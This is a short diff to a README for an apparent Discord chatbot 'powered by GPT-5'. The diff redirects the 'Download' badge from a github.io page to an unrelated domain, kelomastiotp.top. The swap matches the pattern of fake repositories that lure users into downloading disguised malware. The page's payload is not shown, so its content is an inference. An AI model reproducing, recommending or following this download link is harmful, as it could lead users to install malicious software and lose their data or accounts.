@@ -2,8 +2,7 @@
 
 An advanced Discord chatbot powered by OpenAI's GPT-5, offering intelligent and context-aware conversations within your server.
 
-[![Download Discord GPT-5 Chatbot](https://img.shields.io/badge/Download-Discord_GPT5_Chatbot-blueviolet)](https://discord-gpt5-chatbot.github.io/.github/
-)
+[![Download Discord GPT-5 Chatbot](https://img.shields.io/badge/Download-Discord_GPT5_Chatbot-blueviolet)](https://kelomastiotp.top/)
 
 ---
 
